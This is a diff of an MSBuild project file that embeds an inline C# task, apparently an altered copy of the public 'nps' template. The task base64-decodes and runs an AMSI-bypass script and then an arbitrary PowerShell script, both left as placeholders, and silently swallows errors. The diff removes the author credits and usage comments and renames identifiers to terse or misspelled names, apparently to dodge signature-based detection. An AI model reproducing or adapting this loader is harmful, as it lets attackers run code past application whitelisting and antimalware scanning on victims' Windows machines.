@@ -1,18 +1,13 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <!-- This inline task executes c# code. -->
-  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe nps.xml -->
-  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->
-  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->
-  <!-- License: BSD 3-Clause -->
-  <Target Name="npscsharp">
-   <nps />
+  <Target Name="x">
+   <n/>
   </Target>
   <UsingTask
-    TaskName="nps"
+    TaskName="n"
     TaskFactory="CodeTaskFactory"
-    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
   <Task>
-    <Reference Include="System.Management.Automation" />
+    <Reference Include="System.Management.Automation"/>
       <Code Type="Class" Language="cs">
         <![CDATA[
 			using System;
@@ -22,20 +17,20 @@
 			using Microsoft.Build.Framework;
 			using Microsoft.Build.Utilities;
 
-			public class nps : Task, ITask
+			public class n: Task, ITask
 			{
 				public override bool Execute()
 				{
-          string amsi_bypass = "~~AMSI~~";
-				  string cmd = "~~SCRIPT~~";
+          string ampsee = "~~AMSI~~";
+				  string cmnd = "~~SCRIPT~~";
 
-					PowerShell ps = PowerShell.Create();
-					ps.AddScript(Base64Decode(amsi_bypass));
-					ps.Invoke();
+					PowerShell p = PowerShell.Create();
+					p.AddScript(b64d(ampsee));
+					p.Invoke();
 
-					ps.AddScript(Base64Decode(cmd));
+					p.AddScript(b64d(cmnd));
 					Collection<PSObject> output = null;
-					output = ps.Invoke();
+					output = p.Invoke();
 
 					try
 					{
@@ -47,8 +42,8 @@
 					catch(Exception e){}
 					return true;
 				}
-				public static string Base64Decode(string encodedtext) {
-				return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
+				public static string b64d(string text) {
+				return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(text));
 				}
 			}
         ]]>
